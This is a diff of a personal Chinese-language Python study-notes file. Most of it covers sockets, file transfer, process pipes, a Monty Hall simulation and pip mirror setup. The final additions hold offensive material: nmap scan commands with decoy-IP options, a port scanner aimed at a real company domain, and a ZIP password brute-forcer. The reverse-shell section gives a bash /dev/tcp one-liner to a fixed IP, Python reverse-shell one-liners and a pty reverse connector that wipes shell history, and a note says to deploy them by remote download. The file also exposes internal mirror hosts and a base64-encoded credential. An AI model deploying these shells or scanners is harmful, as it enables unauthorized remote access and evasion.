@@ -2198,7 +2198,7 @@ Python3基础学习笔记(精品)  百度文库 挺不错
 
 socket{
 http://www.cnblogs.com/wupeiqi/articles/5040823.html
-
+http://www.cnblogs.com/aylin/p/5572104.html
 注意点：
     1.基于python3.5.2版本的socket只能收发字节（python2.7可以发送字符串）；
     2.客户端退出不能影响服务端；
@@ -2274,6 +2274,16 @@ while True:
     print(str(client_data,encoding='utf8'))
     conn.close()
 
+"""
+root@api:/home/lgj/python/socket# python3.4 s1.py 
+('127.0.0.1', 8082)
+===================
+server waiting...
+<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 8082), raddr=('127.0.0.1', 39695)> ('127.0.0.1', 39695)
+<class 'bytes'>
+bbbbbbbbbbbbbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+hello world!
+"""
 
 #客户端
 #!/usr/bin/env python
@@ -2293,6 +2303,16 @@ print(sk.fileno())
 print("000000000000000000000000000")
 sk.sendto(b'hello world!',('127.0.0.1',9999))
 sk.close()	
+
+"""
+root@api:/home/lgj/python/socket# python3.4 c1.py 
+bbbbbbbbbb
+bbbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+('127.0.0.1', 8082)
+3
+000000000000000000000000000
+"""
+
 }
 
 #连续发消息，结束时，不影响服务端，不遗留数据
@@ -2433,6 +2453,77 @@ while True:
 
 }
 
+例子4
+{
+#上传文件
+
+#服务端
+#!/usr/bin/env python
+# Version = 3.4
+import socket
+
+sk = socket.socket()
+
+sk.bind(("127.0.0.1",8081))
+sk.listen(5)
+
+while True:
+	conn,address = sk.accept()
+	conn.sendall(bytes("欢迎光临我爱我家",encoding="utf-8"))
+
+	size = conn.recv(1024)
+	size_str = str(size,encoding="utf-8")
+	file_size = int(size_str)
+	print("将要准备:",file_size)
+
+	conn.sendall(bytes("开始接收传送", encoding="utf-8"))
+
+	has_size = 0
+	f = open("jj2.png","wb")
+	while True:
+		if file_size == has_size:
+			print("已接收完全")
+			break
+		date = conn.recv(5120)
+		print("接收了datesize:",len(date))
+		f.write(date)
+		has_size += len(date)
+
+	f.close()
+	conn.sendall(bytes("结束接收传送", encoding="utf-8"))
+	break
+
+#客户端
+
+#!/usr/bin/env python
+# Version = 3.4
+import socket
+import os
+
+obj = socket.socket()
+obj.connect(("127.0.0.1",8081))
+
+ret_bytes = obj.recv(1024)
+ret_str = str(ret_bytes,encoding="utf-8")
+print(ret_str)
+
+size = os.stat("jj.png").st_size
+print("size:",size)
+obj.sendall(bytes(str(size),encoding="utf-8"))
+
+ret_bytes=obj.recv(1024)
+ret_str = str(ret_bytes,encoding="utf-8")
+print(ret_str)
+
+with open("jj.png","rb") as f:
+	for line in f:
+		print("发送size:",len(line))
+		obj.sendall(line)
+		
+ret_bytes = obj.recv(1024)
+ret_str = str(ret_bytes,encoding="utf-8")
+print(ret_str)
+}
 
 }
 
@@ -4378,8 +4469,7 @@ TypeError: must be str, not int
 
 }
 
-#base64
-{
+base64{
 
 import base64
 >>> base64.decodebytes(b'c3Vic2NyaWJlcjpTc01pbmkxQA==').decode('utf8')
@@ -4502,8 +4592,7 @@ loop.close()
 
 
 }
-
-#queue 队列
+queue 队列
 {
 
 
@@ -4577,7 +4666,7 @@ p2.start()
 #2.在子进程中执行shell后返回结果到父进程 在不使用subprocess的情况下，进程间怎么交互数据
 ####################################################################################################
 
-#os.popen() 调用的是subprocess 库，找到subprocess.Popen('dwad',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+1.os.popen() 调用的是subprocess 库，找到 subprocess.Popen('dwad',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
 {
 def __init__(self, args, bufsize=-1, executable=None,
                  stdin=None, stdout=None, stderr=None,
@@ -4599,7 +4688,7 @@ os.ttyname(fd)                  # 返回一个字符串，它表示与文件描�
 
 '''
 os.dup2(fd，fd2，inheritable = True)
-#将文件描述符fd重复到fd2，如有必要，关闭后者。
+#将文件描述符fd复制到fd2，如有必要，关闭后者。------就是将fd2重定向到fd
 '''
 
 >>> os.pipe() #8用于写，7用于读
@@ -4641,8 +4730,6 @@ if __name__ == "__main__":
 
     master1, master2 = mkpty()
     while True:
-	
-	
         rl, wl, el = select.select([master1,master2], [], [], 1)
         for master in rl:
             data = os.read(master, 128)
@@ -4696,7 +4783,7 @@ b'1'
 
 '''
 os.dup2(fd，fd2，inheritable = True)
-#将文件描述符fd重复到fd2，如有必要，关闭后者。
+#将文件描述符fd重复到fd2，如有必要，关闭后者。也就是说往fd2上读写就是往fd上，将fd2重定向到fd
 '''
 
 命令tty 查看当前终端对应的设备
@@ -4707,7 +4794,7 @@ pts(pseudo-terminal slave)是pty的实现方法，与ptmx(pseudo-terminal master
 2、伪终端(/dev/pty/)
 3、控制终端(/dev/tty)
 4、控制台终端(/dev/ttyn, /dev/console)
-5 虚拟终端(/dev/pts/n)
+5、虚拟终端(/dev/pts/n)
 /dev/tty代表当前tty设备，在当前的终端中输入 echo “hello” > /dev/tty ，都会直接显示在当前的终端中。
 
 os.execv("/sbin/ifconfig",('-a',)) #可以输出ifconfig的返回
@@ -4780,7 +4867,7 @@ else:
 }
 
 #异步执行
-#os.fork() 
+os.fork() 
 {
 
 import os
@@ -5168,8 +5255,8 @@ jobs（查看后台作业）
 
 }
 
-#try ... except
-{
+
+try {
 try ... except 语句可以带有一个 else子句 ，该子句只能出现在 有 except 子句之
 后。 try语句没有出现异常时，还想要行执行一些代码，可以使这个子句。例 :
 for arg in sys.argv[1:]:
@@ -5205,8 +5292,7 @@ print(dome())
 
 }
 
-#双通道
-{
+双通道{
 #!/usr/bin/python
 import time
 import os
@@ -5242,5 +5328,321 @@ def parent():
 			
 parent()
 }
+
+蒙提霍尔问题{
+"""蒙提霍尔问题:
+有一个游戏 节目，参赛者会看见三扇关闭了的门，其中一扇的后面有一辆汽车，
+选中后面有车的那扇门就可以赢得该汽车，而另外两扇门后面则各藏有一只山羊。
+当参赛者选定了一扇门，但未去开启它的时候，节目主持人开启剩下两扇门的其中一扇，
+露出其中一只山羊。主持人其后会问参赛者要不要换另一扇仍然关上的门。
+问题是：换另一扇门会否增加参赛者赢得汽车的机会率？换与不换赢得汽车的概率分别是多少？
+"""
+import random
+def guess(ischange):
+       wintimes=0
+       for a in range(1,1000): #游戏进行1000次
+              carid=random.randint (0,2)
+              yourguessid=random.randint (0,2)
+              
+              if carid==yourguessid: #第一次选择就是汽车，主持人随机开一个空门
+                     openid=[x for x in range(0,3) if x !=carid][random.randint (0,1)]
+              if carid !=yourguessid: #第一次选择不是汽车，主持人开另一个空门
+                     for b in range(0,3):
+                            if b!=yourguessid and b!=carid:
+                                   openid=b
+              #print("主持人开启一门后,carid,yourguessid,openid:",carid,yourguessid,openid)
+              if ischange:
+                     for c in range(0,3):
+                            if c != openid and c != yourguessid:
+                                   yourguessid=c
+                                   #print(yourguessid)
+                                   break
+              #print("交换后,carid,yourguessid,openid:",carid,yourguessid,openid)
+              if carid==yourguessid:
+                     wintimes+=1
+       print("wintimes:",wintimes)
+
+print("不换赢的次数:")
+guess(False)
+print("换后赢的次数:")
+guess(True)
+
+"""
+被主持人打开一个有羊的门之后，剩下的两个的概率不是各50%，因为已不是随机概率了(已被知情的主持人处理过)。
+换另一个赢的概率是2/3，要换。
+
+也许有人对此答案提出质疑，认为在剩下未开启的两扇门后有汽车的概率都是1/2，因此不需要改猜。为消除这一质疑，
+不妨假定有10扇门的情形，其中一扇门后面有一辆汽车，另外9扇门后面各有一只山羊。
+当竞猜者猜了一扇门但尚未开启时，主持人去开启剩下9扇门中的8扇，露出的全是山羊。
+显然：原先猜的那扇门后面有一辆汽车的概率只是1/10，这时改猜另一扇未开启的门赢得汽车的概率是9/10。
+
+若主持人不知情，则概率无变化。剩余两门：1/2,1/2，无放回抽样类似。
+若主持人知情，概率就会发生变化。剩余两门：未开门的概率为2/3，1/3，非概率事件。
+ """
+
+
+}
+
+pygame{
+#比较不错的系列教材
+#http://www.cnblogs.com/msxh/category/751578.html
+#http://www.cnblogs.com/A-FM/p/6823288.html
+#http://www.cnblogs.com/xiaowuyi/category/426566.html
+}
+
+pip 配置{
+pip install matplotlib
+
+从国内获取默认源可能存在问题，需要添加配置文件，获取国内源。
+有两种方法解决这个问题：
+（1）通过-i参数来指定
+pip install python-nmap -i http://rnd-mirrors.huawei.com/pypi/simple
+#亲测可用
+pip3.4 install python-nmap -i http://rnd-mirrors.huawei.com/pypi/simple --trusted-host rnd-mirrors.huawei.com
+pip install --index-url http://rnd-mirrors.huawei.com/pypi/simple --trusted-host rnd-mirrors.huawei.com pymysql
+pip3.4 install pexpect -i http://10.93.135.120/pypi/simple --trusted-host 10.93.135.120
+（2）通过配置文件来解决
+
+配置公司的镜像源方法如下：
+在C:\Users\域账号\pip（如果没有自己创建）创建pip.ini(C:\Users\lWX307086\pip\pip.ini)，然后再在pip.ini中写入公司的镜像源如下：
+[global]
+trusted-host=rnd-mirrors.huawei.com
+index-url=http://rnd-mirrors.huawei.com/pypi/simple
+
+配置成功后使用 pip install XXXX 即可方便的安装Python第三方包。
+注意，要使用pip，需进入Scripts这个目录(亲测好像不用)
+cd c:\Python27\Scripts
+pip install xxx
+
+linux的文件在~/.pip/pip.conf  (以root用户为例 vi /root/.pip/pip.conf)
+
+}
+
+nmap扫描 {
+
+nmap host #基础扫描
+nmap -T4 -A -v host #完整全面的扫描
+nmap –sn 192.168.1.100-120 #扫描局域网192.168.1.100-192.168.1.120范围内哪些IP的主机是活动的。
+nmap –sn –PE –PS80,135 –PU53 scanme.nmap.org #探测scanme.nmap.org
+nmap –sS –sU –T4 –top-ports 300 192.168.1.100
+#参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；-T4表示时间级别配置4级；--top-ports 300表示扫描最有可能开放的300个端口（TCP和UDP分别有300个端口）
+nmap –sV 10.175.102.179 #对主机192.168.1.100进行版本侦测。
+nmap –O 192.168.1.100 #指定-O选项后先进行主机发现与端口扫描，根据扫描到端口来进行进一步的OS侦测。获取的结果信息有设备类型，操作系统类型，操作系统的CPE描述，操作系统细节，网络距离等。
+nmap -v -F -Pn -D192.168.1.100,192.168.1.102,ME -e eth0 -g 3355 192.168.1.1
+其中，-F表示快速扫描100个端口；-Pn表示不进行Ping扫描；-D表示使用IP诱骗方式掩盖自己真实IP（其中ME表示自己IP）；-e eth0表示使用eth0网卡发送该数据包；-g 3355表示自己的源端口使用3355；192.168.1.1是被扫描的目标IP地址。
+
+nmap -p 1-65535 -T4 -A -v 127.0.0.1 #全端口扫描
+
+#自制端口扫描
+# coding=UTF-8
+import optparse
+import socket
+def connScan(tgtHost, tgtPort):
+    try:
+        connSkt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connSkt.connect((tgtHost, tgtPort))
+        print('[+]%d/tcp open' % tgtPort)
+        connSkt.close()
+    except:
+        print('[-]%d/tcp closed' % tgtPort)
+		
+def portScan(tgtHost, tgtPorts):
+    try:
+        tgtIP = socket.gethostbyname(tgtHost)
+    except:
+        print("[-] Cannot resolve '%s': Unknown host" % tgtHost)
+        return
+    try:
+        tgtName = socket.gethostbyaddr(tgtIP)
+        print('\n[+] Scan Results for: ' + tgtName[0])
+    except:
+        print('\n[+] Scan Results for: ' + tgtIP)
+    socket.setdefaulttimeout(1)
+    for tgtPort in tgtPorts:
+        print('Scanning port ' + str(tgtPort))
+        connScan(tgtHost, int(tgtPort))#测试是否有效
+portScan('www.huawei.com', [80,443,3389,1433,23,445])
+
+
+
+#用字典暴力破解ZIP压缩文件密码
+import zipfile
+import threading
+def extractFile(zFile, password):
+	try:
+		zFile.extractall(pwd=bytes(password,encoding='utf-8'))
+		print("Found Passwd : ", password)
+		return password
+	except:
+		pass
+def main():
+	zFile = zipfile.ZipFile(r'C:\Users\lWX307086\Desktop\五月花\python-work\unzip.zip')
+	passFile = open(r'C:\Users\lWX307086\Desktop\五月花\python-work\dictionary.txt')
+	for line in passFile.readlines():
+		password = line.strip('\n')
+		print(password)
+		#t = threading.Thread(target=extractFile, args=(zFile, password))
+		#t.start()
+		guess = extractFile(zFile, password)
+		print(guess)
+		if guess:
+			print('Password = ', password)
+		else:
+			print("can't find password")
+if __name__ == '__main__':
+	main()
+
+}
+
+pexpect{
+
+http://www.cnblogs.com/darkpig/p/5717902.html
+http://www.cnblogs.com/dkblog/archive/2013/03/20/2970738.html
+#仅linux可用
+ssh{
+#!/usr/bin/env python
+import pexpect
+import getpass, os
+
+#user: ssh 主机的用户名
+#host：ssh 主机的域名
+#password：ssh 主机的密码
+#command：即将在远端 ssh 主机上运行的命令
+def ssh_command (user, host, password, command):
+	ssh_newkey = 'Are you sure you want to continue connecting'
+	# 为 ssh 命令生成一个 spawn 类的子程序对象.
+	child = pexpect.spawn('ssh -l %s %s %s'%(user, host, command))
+	i = child.expect([pexpect.TIMEOUT, ssh_newkey, 'password: '])
+	# 如果登录超时，打印出错信息，并退出.
+	if i == 0: # Timeout
+		print ( 'ERROR!')
+		print ( 'SSH could not login. Here is what SSH said:')
+		print ( child.before, child.after)
+		return None
+	# 如果 ssh 没有 public key，接受它.
+	if i == 1: # SSH does not have the public key. Just accept it.
+		child.sendline ('yes')
+		child.expect ('password: ')
+		i = child.expect([pexpect.TIMEOUT, 'password: '])
+		if i == 0: # Timeout
+			print ( 'ERROR!')
+			print ( 'SSH could not login. Here is what SSH said:')
+			print ( child.before, child.after)
+			return None
+	# 输入密码.
+	child.sendline(password)
+	return child
+
+def main ():
+	# 获得用户指定 ssh 主机域名.
+	host = input('Hostname: ')
+	# 获得用户指定 ssh 主机用户名.
+	user = input('User: ')
+	# 获得用户指定 ssh 主机密码.
+	password = getpass.getpass()
+	# 获得用户指定 ssh 主机上即将运行的命令.
+	command = input('Enter the command: ')
+	child = ssh_command (user, host, password, command)
+	# 匹配 pexpect.EOF
+	child.expect(pexpect.EOF)
+	# 输出命令结果.
+	for x in str(child.before,"utf8").split("\r\n"):
+		print(x)
+	#print ( child.before)
+
+if __name__ == '__main__':
+	main()
+
+
+}
+
+
+}
+
+反弹shell{
+#http://3ms.huawei.com/hi/blog/978951_2336681.html
+反弹shell，或者叫反向shell，是指“被攻击端”主动连接“攻击端”，然后攻击端可通过这个连接完成shell命令操作。
+编写反弹shell的后门程序运行于slave主机上，在另一台attack主机上向slave主机发送触发消息，并接收反弹回来的shell。过程如下：
+
+1. Slave主机后门开始运行，等待触发后门。
+2. attack主机程序开始运行，发送UDP信号触发slave主机的后门， slave主机后门触发后即获取attack主机地址，去主动connect attack主机。既UDP触发，TCP反过来连接。
+3.连接成功后，slave主机将stdin，stdout和stderr重定向到已连接的socketfd上，attack主机通过sockfd发送命令和接收数据。
+4. 结束操作后，关闭端口，并将重定向恢复，再次等待触发。
+
+
+常用的反弹shell脚本{
+
+bash shell反弹脚本
+/bin/bash -i > /dev/tcp/10.175.102.179/443 0<&1 2>&1
+ 
+Python shell 反弹脚本
+#!/usr/bin/python
+# This is a Python reverse shell script
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("127.0.0.1",8082));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+
+利用方式，保存成back.sh 或者back.py ，通过远程下载执行即可利用！
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8082));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',8082))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
+
+}
+#socket
+http://www.cnblogs.com/aylin/p/5572104.html
+
+脚本{
+# -*- coding:utf-8 -*-
+#!/usr/bin/env python
+"""
+back connect py version,only linux have pty module
+code by google security team
+"""
+import sys,os,socket,pty
+shell = "/bin/sh"
+def usage(name):
+    print 'python reverse connector'
+    print 'usage: %s <ip_addr> <port>' % name
+
+def main():
+    if len(sys.argv) !=3:
+        usage(sys.argv[0])
+        sys.exit()
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    try:
+        s.connect((sys.argv[1],int(sys.argv[2])))
+        print 'connect ok'
+    except:
+        print 'connect faild'
+        sys.exit()
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    global shell
+    os.unsetenv("HISTFILE")
+    os.unsetenv("HISTFILESIZE")
+    os.unsetenv("HISTSIZE")
+    os.unsetenv("HISTORY")
+    os.unsetenv("HISTSAVE")
+    os.unsetenv("HISTZONE")
+    os.unsetenv("HISTLOG")
+    os.unsetenv("HISTCMD")
+    os.putenv("HISTFILE",'/dev/null')
+    os.putenv("HISTSIZE",'0')
+    os.putenv("HISTFILESIZE",'0')
+    pty.spawn(shell)
+    s.close()
+
+if __name__ == '__main__':
+    main()
+}
+}
+
+
 }
 
